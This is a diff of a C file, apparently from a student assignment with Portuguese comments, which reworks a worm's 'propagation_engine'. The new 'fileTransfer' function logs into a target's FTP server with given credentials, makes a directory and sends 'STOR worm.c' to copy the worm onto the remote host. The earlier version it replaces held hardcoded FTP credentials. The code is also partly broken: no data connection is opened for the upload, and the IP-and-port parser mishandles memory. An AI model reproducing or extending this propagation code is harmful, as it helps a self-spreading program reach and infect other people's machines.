@@ -13,21 +13,51 @@
 #include <dirent.h>
 #include <fcntl.h>
 
-void propagation_engine(char* ip){
-    int sock = 0, statFolder = 0, statFile = 0, len = 0, size = 0;
+void parseIPPort(char buffer[], char paramPORT[]){
+    char *token = (char*) malloc(sizeof(char));
+    char *aux = (char*) malloc(sizeof(char));
+    int i = 0;
+    
+    /* get the first token */
+    token = strtok(buffer, " ");
+    printf("%s\n", aux);
+   
+    /* walk through other tokens */
+    while(token != NULL) {
+        aux = token;
+        printf("%s\n", token);
+        token = strtok(NULL, " ");
+    }
+ 
+    /* get the first token */
+    token = strtok(aux, "(");
+    aux = token;
+    token = strtok(aux, ")");
+    aux = token;
+    printf("%s\n", aux);
+
+}
+
+void fileTransfer(char *ip, char *username, char *password){
     char buffer[1024];
-    char user[100] = "USER kath\n";
-    char model[100] = "MODE S\n";
-    char type[100] = "TYPE I\n";
-    char pasv[100] = "PASV\n";
-    char pass[100] = "PASS jack\n";
-    char cwd[100] = "CWD /home/\n";
-    char ls[100] = "STAT\n";
-    struct sockaddr_in serverAddr;
+    char paramPORT[50];
+    char user[100] = "USER ";
+    char pass[100] = "PASS ";
+    char model[10] = "MODE S\n";
+    char type[10] = "TYPE I\n";
+    char stru[10] = "STRU F\n";
+    char pasv[10] = "PASV\n";
+    char cwd[100] = "CWD /home/";
+    char cwdWD[100] = "CWD Asgn03KLG/\n";
+    char pwd[10] = "PWD\n";
+    char mkd[20] = "MKD Asgn03KLG\n";
+    char storWorm[25] = "STOR worm.c\n";
     DIR *dir;
+    FILE *arq;
+    int sock = 0, len = 0, size = 0;
+    struct sockaddr_in serverAddr;
     struct dirent *folder;
     struct stat obj;
-    FILE *arq;
 
     //CONNECT FTP
     sock = socket(AF_INET, SOCK_STREAM, 0);
@@ -45,93 +75,144 @@ void propagation_engine(char* ip){
         printf("Erro: conexao falhou. \n");
         exit(1);
     }
-
-    printf("Sucesso FTP \n");
-    /*---Get "Hello?"---*/
-
+    
+    //Resposta do Connect
     bzero(buffer, 1024);
     recv(sock, buffer, sizeof(buffer), 0);
     printf("%s", buffer);
 
+    //Enviando nome do usuario
     memset(buffer, '0', 1024);
+    strcat(user, username);    
+    printf("%s", user);
     if(send(sock, user, strlen(user), 0) < 0){
         printf("Erro: nome do usuario invalido ou incorreto. \n");
         exit(1);    
     }
-    /*---Get "Hello?"---*/
 
+    //Resposta do nome do usuario
     bzero(buffer, 1024);
     recv(sock, buffer, sizeof(buffer), 0);
     printf("%s", buffer);
 
-    
+    //Enviando senha
+    memset(buffer, '0', 1024);
+    strcat(pass, password);
+    printf("%s", pass);
     if(send(sock, pass, strlen(pass), 0) < 0){
         printf("Erro: senha invalida \n");
         exit(1);
     } 
-    /*---Get "Hello?"---*/
 
+    //Resposta da Senha
     bzero(buffer, 1024);
     recv(sock, buffer, sizeof(buffer), 0);
     printf("%s", buffer);
 
+    //Enviando Modo de Transferencia: Stream
     memset(buffer, '0', 1024);
     send(sock, model, strlen(model), 0);
+
+    //Resposta do Modo
     bzero(buffer, 1024);
     recv(sock, buffer, sizeof(buffer), 0);
     printf("%s", buffer);
  
+    //Enviando Tipo de Transferencia: Binario
     memset(buffer, '0', 1024);
     send(sock, type, strlen(type), 0);
+    
+    //Resposta do Tipo
     bzero(buffer, 1024);
     recv(sock, buffer, sizeof(buffer), 0);
     printf("%s", buffer);
 
+    //Enviando Estrutura de Dados: F
+    memset(buffer, '0', 1024);
+    send(sock, stru, strlen(stru), 0);
+    
+    //Resposta da Estrutura de Dados
+    bzero(buffer, 1024);
+    recv(sock, buffer, sizeof(buffer), 0);
+    printf("%s", buffer);
+
+    //Enviando Passive Mode
     memset(buffer, '0', 1024);
     send(sock, pasv, strlen(pasv), 0);
+
+    //Resposta do Passive Mode
     bzero(buffer, 1024);
     recv(sock, buffer, sizeof(buffer), 0);
     printf("%s", buffer);
 
+    parseIPPort(buffer, paramPORT);
+
+    //Enviando comando 'CD'
     memset(buffer, '0', 1024);
+    strcat(cwd, username);
     send(sock, cwd, strlen(cwd), 0);
+    
+    //Resposta do 'CD'
     bzero(buffer, 1024);
     recv(sock, buffer, sizeof(buffer), 0);
     printf("%s", buffer);
     
+    //Enviando comando 'PWD'
     memset(buffer, '0', 1024);
-    send(sock, ls, strlen(ls), 0);
+    send(sock, pwd, strlen(pwd), 0);
+    
+    //Resposta do 'PWD'
     bzero(buffer, 1024);
     recv(sock, buffer, sizeof(buffer), 0);
     printf("%s", buffer);
-    //pwd
-    
-    //CD
-/*    strcpy(buffer, "CWD /home/");
-    strcat(buffer, user);
-    send(sock, buffer, 100, 0);
-    recv(sock, &statFolder, sizeof(int), 0);
-    if(statFolder)
-        printf("Remote directory successfully changed\n");
-    else
-        printf("Remote directory failed to change\n");
-*/
-    /*---Get "Hello?"---*/
 
-  /*  bzero(buffer, 1024);
+    //Enviando comando 'MKD'
+    memset(buffer, '0', 1024);
+    send(sock, mkd, strlen(mkd), 0);
+    
+    //Resposta do 'MKD'
+    bzero(buffer, 1024);
     recv(sock, buffer, sizeof(buffer), 0);
     printf("%s", buffer);
 
-    memset(buffer, '0', 1024);*/
-    //pwd
- /*   strcpy(buffer, "pwd");
-    send(sock, buffer, 100, 0);
-    recv(sock, buffer, 100, 0);
-    printf("The path of the remote directory is: %s\n", buffer);
-
+    //Enviando comando 'CD'
     memset(buffer, '0', 1024);
+    send(sock, cwdWD, strlen(cwdWD), 0);
+    
+    //Resposta do 'CD'
+    bzero(buffer, 1024);
+    recv(sock, buffer, sizeof(buffer), 0);
+    printf("%s", buffer);
+    
+    //Enviando comando 'PWD'
+    memset(buffer, '0', 1024);
+    send(sock, pwd, strlen(pwd), 0);
+    
+    //Resposta do 'PWD'
+    bzero(buffer, 1024);
+    recv(sock, buffer, sizeof(buffer), 0);
+    printf("%s", buffer);
+
+    //Enviando comando Worm.c
+    memset(buffer, '0', 1024);
+    send(sock, storWorm, strlen(storWorm), 0);
+    
+    //Resposta do Worm.c
+    bzero(buffer, 1024);
+    recv(sock, buffer, sizeof(buffer), 0);
+    printf("%s", buffer);
+
+    if(sock >= 0){
+        close(sock);
+    }
+}
+
+void propagation_engine(char* ip, char *username, char *pass){
+    
+    fileTransfer(ip, username, pass);
+
     //catch files names and transfer via put ftp
-    dir = opendir(".");
+   /* dir = opendir(".");
     if(dir){
         while(folder = readdir(dir)){
             if(!strcmp(folder->d_name, "."))
@@ -163,7 +244,4 @@ void propagation_engine(char* ip){
         }
     }*/
 
-    if(sock >= 0){
-        close(sock);
-    }
 }
